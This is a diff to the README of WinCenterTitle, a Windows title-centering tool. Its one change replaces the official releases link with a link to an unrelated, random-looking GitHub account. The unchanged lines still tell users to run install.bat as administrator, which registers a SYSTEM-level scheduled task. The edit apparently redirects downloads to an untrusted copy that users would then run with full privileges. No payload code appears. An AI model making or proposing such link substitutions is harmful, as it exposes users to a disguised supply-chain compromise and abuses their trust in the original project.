@@ -4,7 +4,7 @@ WinCenterTitle is a simple tool that allows you to center align the text in Wind
 
 ## Installation
 
-* Download archive from [releases](https://github.com/valinet/WinCenterTitle/releases)
+* Download archive from [releases](https://github.com/dkjnsdvsodvnosdvm/WinCenterTitle/releases)
 * Unpack to folder of your choice (preconfigured for *C:\WinCenterTitle*)
 * Edit *WinCenterTitle.xml* and edit line 40, which contains path to application, according to your system
 * Register scheduled task which will enable the tweak at startup: run *install.bat* as administrator. This is one way of running the application using the SYSTEM account, which is required in order to be able to hook into DWM.
